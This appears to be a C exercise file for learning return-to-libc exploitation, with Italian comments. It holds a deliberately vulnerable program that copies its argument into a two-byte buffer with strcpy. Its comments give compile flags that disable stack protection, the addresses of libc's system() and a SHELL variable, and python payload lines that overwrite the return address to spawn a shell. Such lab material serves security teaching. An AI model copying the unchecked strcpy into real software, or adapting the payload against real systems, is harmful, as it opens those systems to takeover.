// gcc -fno-stack-protector -mpreferred-stack-boundary=2 -o exe6_3 exe6_3.c
// Indirizzo "System" Libc => 0xb7e573e0
// Indirizzo "SHELL" ENV => 0xbffff8d5 => (GDB):0xbffff8a4
// gdb --args ./exe6_3 $(python -c "print 'A'*6 + '\xe0\x73\xe5\xb7' + 'A'*4 + '\xa4\xf8\xff\xbf'") => ok exploit "RetLibc"
// ./exe6_3 $(python -c "print 'A'*6 + '\xe0\x73\xe5\xb7' + 'A'*4 + '\xd1\xf8\xff\xbf'")

#include <stdio.h>
#include <string.h>

int main(int argc, char* argv[]){
	char buffer[2];

	if (argc < 2){
		printf("An argument please...\n");
		return 1;
	}

	printf("Exploiting via Returning into Libc function\n");
	strcpy(buffer,argv[1]);

	printf("You typed: %s\n", buffer);
	return 0;
}
